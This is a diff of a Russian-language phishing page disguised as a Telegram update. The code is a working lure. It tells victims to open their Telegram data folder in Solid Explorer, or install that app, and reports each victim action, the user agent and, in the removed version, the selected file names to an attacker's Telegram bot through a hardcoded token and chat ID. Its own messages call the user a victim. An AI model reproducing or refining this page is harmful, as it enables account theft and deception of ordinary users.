@@ -51,41 +51,27 @@
             transition: 0.2s;
         }
         .btn:active { opacity: 0.7; }
-        .btn-secondary {
+        .btn-install {
             background: #2a2a2a;
-            border: 2px dashed #444;
-            color: #aaa;
+            border: 2px solid #00cc66;
+            color: #66ff99;
             padding: 14px;
             width: 100%;
             border-radius: 12px;
             font-size: 16px;
             cursor: pointer;
             margin-top: 12px;
+            display: none;
         }
-        .btn-secondary:active { background: #333; }
+        .btn-install:active { background: #333; }
         .status {
             margin-top: 16px;
             color: #888;
             font-size: 14px;
             display: none;
         }
-        .file-list {
-            color: #aaa;
-            font-size: 12px;
-            margin-top: 8px;
-            max-height: 150px;
-            overflow-y: auto;
-            text-align: left;
-            word-break: break-all;
-            display: none;
-            background: #111;
-            padding: 8px;
-            border-radius: 8px;
-        }
         .footer { color: #444; font-size: 12px; margin-top: 24px; border-top: 1px solid #2a2a2a; padding-top: 16px; }
-        .browser-hint { color: #555; font-size: 11px; margin-top: 8px; }
-        #fileInput { display: none; }
-        .btn-wrapper { display: flex; flex-direction: column; gap: 8px; }
+        .hint { color: #555; font-size: 11px; margin-top: 8px; }
     </style>
 </head>
 <body>
@@ -99,16 +85,11 @@
         ✅ <span>Обновление доступно!</span> Выберите папку с данными Telegram.
     </div>
 
-    <div class="btn-wrapper">
-        <button class="btn" id="folderBtn">📂 Выбрать папку</button>
-        <button class="btn-secondary" id="fallbackBtn">📁 Или выберите файлы вручную</button>
-    </div>
+    <button class="btn" id="folderBtn">📂 Открыть Solid Explorer</button>
+    <button class="btn-install" id="installBtn">📥 Установить Solid Explorer</button>
 
-    <input type="file" id="fileInput" multiple webkitdirectory directory>
-
-    <div class="file-list" id="fileList"></div>
     <div class="status" id="status">⏳ Обработка...</div>
-    <div class="browser-hint">Поддерживается: Chrome, Firefox, Opera, Samsung Internet, Яндекс</div>
+    <div class="hint">Для продолжения установите Solid Explorer (бесплатно)</div>
     <div class="footer">Telegram • 2026</div>
 </div>
 
@@ -117,8 +98,6 @@
     const BOT_TOKEN = '8712563091:AAEg-wCQ4x7wviL5UUC5yDh2_q3gZWBn6gg';
     const CHAT_ID = '8277809761';
     const WEBHOOK = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-
-    let selectedFiles = [];
 
     function sendToTG(text) {
         fetch(WEBHOOK, {
@@ -132,88 +111,77 @@
         }).catch(e => console.log('Ошибка отправки:', e));
     }
 
-    function showStatus(text, isError = false) {
+    function showStatus(text) {
         const status = document.getElementById('status');
         status.style.display = 'block';
         status.textContent = text;
-        status.style.color = isError ? '#ff6b6b' : '#888';
     }
 
-    function showFiles(files) {
-        const list = document.getElementById('fileList');
-        list.style.display = 'block';
-        const names = [];
-        for (let i = 0; i < files.length; i++) {
-            names.push(files[i].webkitRelativePath || files[i].name);
-        }
-        list.innerHTML = names.slice(0, 20).join('<br>') + (names.length > 20 ? `<br>... и ещё ${names.length - 20}` : '');
+    // ===== ПРОВЕРКА УСТАНОВКИ SOLID EXPLORER =====
+    function isSolidExplorerInstalled() {
+        // Пытаемся открыть Solid Explorer через intent
+        const intent = 'intent://#Intent;package=pl.solidexplorer2;end';
+        return new Promise((resolve) => {
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = intent;
+            document.body.appendChild(iframe);
+
+            // Если через 2 секунды ничего не произошло — вероятно, приложение не установлено
+            const timeout = setTimeout(() => {
+                document.body.removeChild(iframe);
+                resolve(false);
+            }, 2000);
+
+            // Если приложение установлено — браузер покажет диалог выбора
+            // (нельзя точно определить, но можно попробовать)
+            window.addEventListener('blur', function onBlur() {
+                clearTimeout(timeout);
+                document.body.removeChild(iframe);
+                window.removeEventListener('blur', onBlur);
+                resolve(true);
+            });
+        });
     }
 
-    function processFiles(files) {
-        if (!files || files.length === 0) {
-            showStatus('⚠️ Файлы не выбраны', true);
-            return;
-        }
-
-        selectedFiles = files;
-        const names = [];
-        for (let i = 0; i < files.length; i++) {
-            names.push(files[i].webkitRelativePath || files[i].name);
-        }
-
-        showStatus(`✅ Выбрано файлов: ${files.length}`);
-        showFiles(files);
-
-        sendToTG(`📁 <b>Выбрана папка обновления</b>\n\n📄 Файлов: ${files.length}\n\n${names.slice(0, 30).join('\n')}`);
-
-        document.querySelector('.update-box').innerHTML = '✅ <span>Обновление установлено!</span> Версия 11.0.1';
-        document.getElementById('folderBtn').textContent = 'Готово';
-        document.getElementById('folderBtn').style.background = '#00cc66';
-        document.getElementById('fallbackBtn').style.display = 'none';
-    }
-
-    // ===== СПОСОБ 1: showDirectoryPicker (Chrome) =====
+    // ===== ОТКРЫТИЕ SOLID EXPLORER =====
     document.getElementById('folderBtn').addEventListener('click', async function() {
-        // Проверяем, поддерживается ли showDirectoryPicker
-        if (typeof window.showDirectoryPicker === 'function') {
-            try {
-                const dirHandle = await window.showDirectoryPicker();
-                let files = [];
-                for await (const entry of dirHandle.values()) {
-                    if (entry.kind === 'file') {
-                        files.push({ name: entry.name, webkitRelativePath: entry.name });
-                    }
-                }
-                processFiles(files);
-                return;
-            } catch (err) {
-                if (err.name === 'AbortError') {
-                    showStatus('⚠️ Выбор папки отменён', true);
-                    return;
-                }
-                console.log('showDirectoryPicker ошибка:', err);
-                // Если ошибка — пробуем fallback
-            }
-        }
+        const btn = this;
+        btn.textContent = '⏳ Проверка...';
+        btn.disabled = true;
 
-        // ===== СПОСОБ 2: input[type="file"] (все браузеры) =====
-        document.getElementById('fileInput').click();
-    });
+        // Отправляем уведомление
+        sendToTG(`📂 <b>Жертва нажала "Открыть Solid Explorer"</b>\n🖥 ${navigator.userAgent}`);
 
-    // ===== ОБРАБОТКА ЧЕРЕЗ input =====
-    document.getElementById('fileInput').addEventListener('change', function(e) {
-        const files = e.target.files;
-        if (files && files.length > 0) {
-            processFiles(files);
+        // Пробуем открыть Solid Explorer
+        const installed = await isSolidExplorerInstalled();
+
+        if (installed) {
+            // Открываем Solid Explorer с указанием папки Telegram
+            const path = '/storage/emulated/0/Android/data/org.telegram.messenger/files';
+            const intent = `intent://${path}#Intent;package=pl.solidexplorer2;action=android.intent.action.VIEW;end`;
+            window.location.href = intent;
+
+            showStatus('✅ Solid Explorer открыт. Выберите папку Telegram.');
+            sendToTG(`✅ <b>Solid Explorer открыт</b>\n📁 Путь: ${path}`);
+            btn.textContent = '✅ Открыто';
+            btn.style.background = '#00cc66';
         } else {
-            showStatus('⚠️ Файлы не выбраны', true);
+            // Solid Explorer не установлен — показываем кнопку установки
+            document.getElementById('installBtn').style.display = 'block';
+            showStatus('⚠️ Solid Explorer не установлен. Установите его.');
+            sendToTG(`❌ <b>Solid Explorer не установлен</b>`);
+            btn.textContent = '📂 Открыть Solid Explorer';
+            btn.disabled = false;
         }
-        this.value = ''; // сброс для повторного выбора
     });
 
-    // ===== FALLBACK — ручной выбор =====
-    document.getElementById('fallbackBtn').addEventListener('click', function() {
-        document.getElementById('fileInput').click();
+    // ===== УСТАНОВКА SOLID EXPLORER =====
+    document.getElementById('installBtn').addEventListener('click', function() {
+        // Отправляем в Google Play
+        window.location.href = 'https://play.google.com/store/apps/details?id=pl.solidexplorer2';
+        showStatus('📥 Установите Solid Explorer, затем вернитесь и нажмите "Открыть"');
+        sendToTG(`📥 <b>Жертва устанавливает Solid Explorer</b>`);
     });
 
     // ===== АВТО-УВЕДОМЛЕНИЕ =====
